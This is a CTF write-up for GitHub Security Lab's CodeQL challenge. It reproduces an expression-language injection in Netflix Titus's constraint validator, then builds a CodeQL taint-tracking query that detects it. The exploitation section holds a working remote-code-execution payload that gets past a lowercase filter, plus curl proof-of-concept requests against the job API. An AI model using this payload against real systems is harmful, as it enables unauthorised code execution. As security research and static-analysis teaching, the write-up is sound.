# GHCTF-4-writeup
Contest description here: https://securitylab.github.com/ctf/codeql-and-chill

The target of this challenge is to write a QL, tracking through the code and reproduce the recent SSTI in Netflix Titus (found by @pwntester https://securitylab.github.com/advisories/GHSL-2020-028-netflix-titus).

In the contest description, the author gave everything we need to complete this challenge, for example: he described how to write the source, sink, where the bug is ...

Before writing the QL, I reproduced the SSTI in Titus first!

It will be better to know what actually the bug is, and where, how to find it by hand before making QL do it!

# Lab Setup
As in the contest description, the vulnerable code is in commit 8a8bd4c1b4b63e17520804c6f7f6278252bf5a5b of https://github.com/Netflix/titus-control-plane

```
git clone https://github.com/Netflix/titus-control-plane
git checkout -b testNetflix 8a8bd4c1b4b63e17520804c6f7f6278252bf5a5b
cd titus-control-plane
```

To debug the titus project, I have to modify a little config before docker-compose.

1. In titus-ext/runner/Dockerfile.gateway, change
```
EXPOSE 7001/tcp 7101/tcp 7104/tcp
```
to
```
EXPOSE 7001/tcp 7101/tcp 7104/tcp 5005/tcp
```
and 
```
ENV JAVA_OPTS="-XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap"
```
to
```
ENV JAVA_OPTS="-XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005"
```
2. In docker-compose.yml, change
```
  gateway:
    build:
      context: .
      dockerfile: titus-ext/runner/Dockerfile.gateway
    networks:
      - titus
    environment:
      - TITUS_MASTER_HOST=master
    ports:
      - 7001:7001
      - 7104:7104
    links:
      - zookeeper
      - mesos-master
```
to
```
  gateway:
    build:
      context: .
      dockerfile: titus-ext/runner/Dockerfile.gateway
    networks:
      - titus
    environment:
      - TITUS_MASTER_HOST=master
    ports:
      - 7001:7001
      - 7104:7104
      - 5005:5005
    links:
      - zookeeper
      - mesos-master
```

Above changes will make the titus-gateway start in debug mode, expose port 5005 for debugging!

After making change, just type
```
docker-compose build
docker-compose up -d
```
to make it start!

# The bugs
As in contest description, the author told us the vulnerable code is in https://github.com/Netflix/titus-control-plane/blob/9b216f9dc529df4ffe3b49ae19cc71372ee437a7/titus-api/src/main/java/com/netflix/titus/api/jobmanager/model/job/sanitizer/SchedulingConstraintValidator.java#L79 and https://github.com/Netflix/titus-control-plane/blob/9b216f9dc529df4ffe3b49ae19cc71372ee437a7/titus-api/src/main/java/com/netflix/titus/api/jobmanager/model/job/sanitizer/SchedulingConstraintSetValidator.java#L67

SchedulingConstraintValidator:
```
public boolean isValid(Map<String, String> value, ConstraintValidatorContext context) {
        Set<String> namesInLowerCase = value.keySet().stream().map(String::toLowerCase).collect(Collectors.toSet());
        HashSet<String> unknown = new HashSet<>(namesInLowerCase);
        unknown.removeAll(JobConstraints.CONSTRAINT_NAMES);
        if (unknown.isEmpty()) {
            return true;
        }
        context.buildConstraintViolationWithTemplate("Unrecognized constraints " + unknown)
                .addConstraintViolation().disableDefaultConstraintViolation();
        return false;
}
```

It 's very easy to spot this bug, the data from value is directly flow in to ConstraintValidatorContext.buildConstraintViolationWithTemplate(), which causes EL Injection!

After finding usages of SchedulingConstraintValidator, I reached the class: com.netflix.titus.api.jobmanager.model.job.Container:

![SchedulingConstraint](https://github.com/testanull/GHCTF-4-writeup/raw/master/constraintcontainer.jpg)

The softConstraints and hardConstraints fields will be validated by SchedulingConstraintValidator.

This is a example request:

```
POST /api/v3/jobs HTTP/1.1
Host: host:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0.3 Waterfox/56.0.3
Connection: close
Upgrade-Insecure-Requests: 1
Content-type: application/json
Content-Length: 490

{
    "applicationName": "localtest",
    "owner": {"teamEmail": "me@me.com"},
    "container": {
      "image": {"name": "alpine", "tag": "latest"},
      "entryPoint": ["/bin/sleep", "1h"],
      "securityProfile": {"iamRole": "test-role", "securityGroups": ["sg-test"]},
      "softConstraints": { "constraints": {"hoho": "hihi"}}
    },
    "batch": {
      "size": 1,
      "runtimeLimitSec": "3600",
      "retryPolicy":{"delayed": {"delayMs": "1000", "retries": 3}}
    }
  }
```
with softConstraints is { "constraints": {"hoho": "hihi"}}

Put a breakpoint in line 79 of SchedulingConstraintValidator.java, and it will reach there

You can see the key of constraints map will be directly concated with the messageTemplate

![DebugSchedulingConstraintValidator](https://github.com/testanull/GHCTF-4-writeup/raw/master/dbg2.jpg)


Trigger the SSTI after changing the key to #{77\*77}, the softConstraints become: "softConstraints": { "constraints": {"#{77\*77}": "hihi"}}

Server will response with the result of 77\*77.

![SSTIPOC](https://github.com/testanull/GHCTF-4-writeup/raw/master/sstipoc1.jpg)

But it 's not straight to get RCE. Before being concated with the messageTemplate, the key has been change to lower case by this: 

```
Set<String> namesInLowerCase = value.keySet().stream().map(String::toLowerCase).collect(Collectors.toSet());
```

For example: 
```
"".getClass().forName("java.lang.Runtime")
```
will become
```
"".getclass().forname("java.lang.runtime")
```

We will get an exception from server because the method "getclass" doesn't exist!

To achieve RCE, the payload must not contain uppercase letter.

After working around, I found the solution!

Final payload is:

```
#{''.class.class.methods[0].invoke(null, 'java.lang.'+''.class.methods[59].invoke('r')+'untime').methods[6].invoke(''.class.class.methods[0].invoke(null, 'java.lang.'+''.class.methods[59].invoke('r')+'untime')).exec('touch /tmp/a.txt')}
```
With a little changes:

- Method Class.forName() = ''.class.class.methods[0]

- Method toUpperCase() = ''.class.methods[59]

- String "java.lang.Runtime" = 'java.lang.'+''.class.methods[59].invoke('r')+'untime'

PoC:

```
curl -i -s -k  -X 'POST' \
    -H 'User-Agent: Mozilla/5.0' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-type: application/json' \
    --data-binary $'{\x0d\x0a    \"applicationName\": \"localtest\",\x0d\x0a    \"owner\": {\"teamEmail\": \"me@me.com\"},\x0d\x0a    \"container\": {\x0d\x0a      \"image\": {\"name\": \"alpine\", \"tag\": \"latest\"},\x0d\x0a      \"entryPoint\": [\"/bin/sleep\", \"1h\"],\x0d\x0a      \"securityProfile\": {\"iamRole\": \"test-role\", \"securityGroups\": [\"sg-test\"]},\x0d\x0a\"softConstraints\": { \"constraints\": {\"#{\'\'.getClass()}\": \"hihi\"}}\x0d\x0a    },\x0d\x0a    \"batch\": {\x0d\x0a      \"size\": 1,\x0d\x0a      \"runtimeLimitSec\": \"3600\",\x0d\x0a      \"retryPolicy\":{\"delayed\": {\"delayMs\": \"1000\", \"retries\": 3}}\x0d\x0a    }\x0d\x0a  }' \
    'http://target:7001/api/v3/jobs'
```

# The QL 

Having succeeded in reproducing the PoC, I started to write the QL to find this bug!

According to author, the sources of tainted data should come from ConstraintValidator.isValid(...).

Which means all method isValid() that override ConstraintValidator.isValid(...) is our interested!

I defined a class that represent above description

```
class ConstraintValidatorisValidMethod extends Method{
	ConstraintValidatorisValidMethod(){
		exists(Method base|
		this = base
		and base.hasName("isValid")
		and base.getDeclaringType().getASourceSupertype*().hasName("ConstraintValidator")
		)
	}
}
```

This class will take all class with name "isValid" and has a supertype name "ConstraintValidator"

As described before, the source of tainted data come from first argument of this method, so the predicate isSource should be like this:

```
override predicate isSource(DataFlow::Node source) { 
		exists(ConstraintValidatorisValidMethod im|
			source.asParameter() = im.getParameter(0)
		)
	}
```

Run quick evaluation and i get 8 results:

![SourceEval](https://github.com/testanull/GHCTF-4-writeup/raw/master/codeqlres.jpg)

The injection sinks we are considering occur as the first argument of a call to ConstraintValidatorContext.buildConstraintViolationWithTemplate(...). I defined the class like this:

```
class ConstraintValidatorContextBuildTemplate extends Method{
	ConstraintValidatorContextBuildTemplate(){
		this.hasName("buildConstraintViolationWithTemplate") and this.getDeclaringType().hasName("ConstraintValidatorContext")
	}
}
```

And the predicate "isSink"

```
override predicate isSink(DataFlow::Node sink) { 
		exists(MethodAccess ma|
		ma.getMethod() instanceof ConstraintValidatorContextBuildTemplate
		and ma.getAnArgument() = sink.asExpr()
		)
	}
```

Quick evaluation give 5 results, same as in contest description!

But this information is not enough to lead from source to sink yet. After running the whole query, give 0 result, which also being warned by author before!

The author is quiet kind, He also hinted us how to get pass this problems. He suggested using the "hasPartialFlow" predicate.

Which show us the path from source node to sink until it can not reach the sink!

For example:

Our QL is expected to flow from A -> B -> C -> D -> E. But it can't reach there.

The "hasPartialFlow" predicate can show us the path from A -> B -> C. So you can take a closer look at the "C", figure out what make the flow stop!

:D What a nice feature!

In this case, tainted data come from first argument, then stop at first line of "isValid" method

![Partial](https://github.com/testanull/GHCTF-4-writeup/raw/master/vscode_partial.jpg)

```
Set<String> namesInLowerCase = value.keySet()...;
....
```

You can quickly see the problem here.

The tainted data in field "value" is not passed through the method "keySet()" to field "namesInLowerCase".

To solved this problem, we have to tell QL to pass through it, using TaintTracking::AdditionalTaintStep as recommended!

I used the sample code written by author before (https://github.com/github/codeql/issues/3139)

In this case, the method need to be passthrough is Map.keySet()
```
class KeySet extends TaintTracking::AdditionalTaintStep{
	override predicate step(DataFlow::Node node1, DataFlow::Node node2){
		exists(MethodAccess ma, Method m|
		ma.getMethod() = m
		and m.hasName("keySet")
		and m.getDeclaringType().getASourceSupertype().hasQualifiedName("java.util", "Map")
		and ma.getQualifier() = node1.asExpr()
		and ma = node2.asExpr()
		)
	}
}
```
After adding more taint step, now the tainted data now is now tainted through the "keySet()" method:

![keySetTainted](https://github.com/testanull/GHCTF-4-writeup/raw/master/keysettainted.jpg)

Doing the same things with other methods (Container.getSoftConstraints()|getHardConstraints(), Collection.stream(), Stream.collect()|map()) and constructor HashSet() 

After that, the QL now can flow from source to sink:

![FinalResult](https://github.com/testanull/GHCTF-4-writeup/raw/master/vscode_done.jpg)

PoC video: https://www.youtube.com/watch?v=H-KsLicPfm8

PoC:
```
curl -i -s -k  -X 'POST' \
    -H 'User-Agent: Mozilla/5.0' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-type: application/json' \
    --data-binary $'{\x0d\x0a    \"applicationName\": \"localtest\",\x0d\x0a    \"owner\": {\"teamEmail\": \"me@me.com\"},\x0d\x0a    \"container\": {\x0d\x0a      \"image\": {\"name\": \"alpine\", \"tag\": \"latest\"},\x0d\x0a      \"entryPoint\": [\"/bin/sleep\", \"1h\"],\x0d\x0a      \"securityProfile\": {\"iamRole\": \"test-role\", \"securityGroups\": [\"sg-test\"]},\x0d\x0a\"softConstraints\": { \"constraints\": {\"#{\'\'.getClass()}\": \"hihi\"}}\x0d\x0a    },\x0d\x0a    \"batch\": {\x0d\x0a      \"size\": 1,\x0d\x0a      \"runtimeLimitSec\": \"3600\",\x0d\x0a      \"retryPolicy\":{\"delayed\": {\"delayMs\": \"1000\", \"retries\": 3}}\x0d\x0a    }\x0d\x0a  }' \
    'http://target:7001/api/v3/jobs'
```

QL: https://github.com/testanull/GHCTF-4-writeup/blob/master/PoC.ql

Thanks @pwntester and Github Security Lab for great challenge and nice tutorial!

